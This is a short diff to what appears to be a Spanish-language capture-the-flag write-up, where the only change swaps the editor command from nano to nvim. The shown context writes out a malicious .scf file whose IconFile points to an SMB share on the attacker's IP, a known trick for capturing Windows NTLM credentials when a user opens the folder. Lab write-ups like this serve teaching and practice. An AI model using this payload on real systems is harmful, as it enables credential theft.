@@ -52,7 +52,7 @@ En la parte de Firmware podemos cargar un archivo.  Por lo que estamos frente a 
 
 Y haremos el siguiente:
 ```bash
-❯ nano file.scf
+❯ nvim file.scf
 	[shell]
 	Command=2
 	IconFile=\\10.10.14.13\smbFolder\test.ico    # Colocamos nuestra IP ,el recurso que vamos a compartir se llama 'smbFolder' y se cargara un icono aunque no exista
